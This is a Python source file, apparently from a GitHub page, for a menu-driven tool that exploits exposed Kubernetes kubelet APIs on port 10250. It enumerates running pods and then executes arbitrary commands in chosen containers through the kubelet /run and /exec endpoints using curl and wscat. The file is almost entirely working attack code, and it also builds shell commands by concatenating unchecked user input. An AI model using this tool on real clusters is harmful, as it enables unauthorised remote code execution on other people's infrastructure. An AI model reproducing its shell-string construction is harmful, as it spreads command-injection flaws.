import os
import subprocess
from termcolor import colored #Used to render graphic in color
# import termcolor
import re #Required for findall function
#Report bugs to officialhocc@gmail.com

k = 0 #Used to control "While" loop. Will print menu screen until user enters the exit selection which will break the loop and exit the program.
var = ''
cmd = ''
params = var
params1 = ''
params2 = ''
params3 = ''
while k == 0:
	print (colored(' __  __ _______ ______ _______ ______ _______ _______ __  __ _______ ','yellow'))
	print (colored('|  |/  |   |   |   __ \\    ___|   __ \\    |  |   |   |  |/  |    ___|','yellow'))
	print (colored('|     <|   |   |   __ <    ___|      <       |   |   |     <|    ___|','yellow'))
	print (colored('|__|\\__|_______|______/_______|___|__|__|____|_______|__|\\__|_______|','yellow'))
	print (colored('Help Desk: If you already have the namespace, pod & container name,','blue'))
	print (colored('Select "1" and enter the target without "run" or "exec" in the URL. (E.g. https://10.10.10.10:10250/namespace/pod/container)','blue'))
	print (colored('If you do not know the namespace, pod or container then select 2.','blue'))
	print (colored('\nEnter "0" at any point to return to the main menu','blue'))

	if var == '':
		var = "Host is Not Recorded"
	print (colored("1) Current Host: "+'"'+var+'"','red'))
	print("\n2) Find Namespace, Pods & Container Names")
	print("3) Use RUN Debug Handler")
	print("4) Use EXEC Debug Handler")
	print("5) Clear Screen")
	print("6) Exit\n")
	t = input('Enter Selection: ')
	if t == '1':
		var = input('Target: ')
	if t == '2':
		params = input('Target (E.g. https://10.10.10.10:10250/): ')
		cmd3 = 'curl -sk '+params+'runningpods/ | python -mjson.tool'
		os.system(cmd3)
		params1 = input('Select Namespace: ')
		params2 = input('Select Pod: ')
		params3 = input('Select Container: ')
		coll = params+params1+"/"+params2+"/"+params3
		var = params
	if t == '3':
		if params1 == '':
			params1 = input('Select Namespace: ')
			params2 = input('Select Pod: ')
			params3 = input('Select Container: ')
		y = 0
		var2 = var+"run/"+params1+"/"+params2+"/"+params3
		print("Parameters: "+var2)
		while y == 0:
			command2 = input('\nCMD: ')
			cmd2 = 'curl -k -XPOST '+'"'+var2+'"'+' -d '+'"cmd='+command2+'"'
			if command2 == '0':
				y = 1
			else:
				os.system(cmd2)
	if t == '4':
		if params1 == '':
			params1 = input('Select Namespace: ')
			params2 = input('Select Pod: ')
			params3 = input('Select Container: ')
		y = 0
		var2 = var+"exec/"+params1+"/"+params2+"/"+params3
		print("Parameters: "+var2)
		while y == 0:
			command2 = input('\nCMD: ')
			regex = '/[^a-zA-Z0-9]|[^ ]+' #
			content = command2
			findings = re.findall(regex, content)
			saved = ('&command='.join(findings))
			cmd1 = 'curl -i --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST '+'"'+var2+"?command="+saved+"&input=1&output=1&tty=1"+'"'+" > tmp.txt"
			if command2 == '0':
				y = 1
				os.system('del tmp.txt' if os.name == 'nt' else 'rm tmp.txt')
			else:
				os.system(cmd1)
				print("Parameters: "+cmd1)
				regex2 = ('cri/exec/.*\w')
				words = re.findall(regex2,open('tmp.txt').read())
				exp = (''.join(''.join(elems) for elems in words))
				cmd4 = "wscat -c "+var+exp+" --no-check"
				print(cmd4)
				os.system(cmd4)
	if t == '5':
		os.system('cls' if os.name == 'nt' else 'clear')
	if t == '6':
		k = 1
		print("\nGoodbye")
Footer
© 2022 GitHub, Inc.
Footer navigation
Terms
Privacy
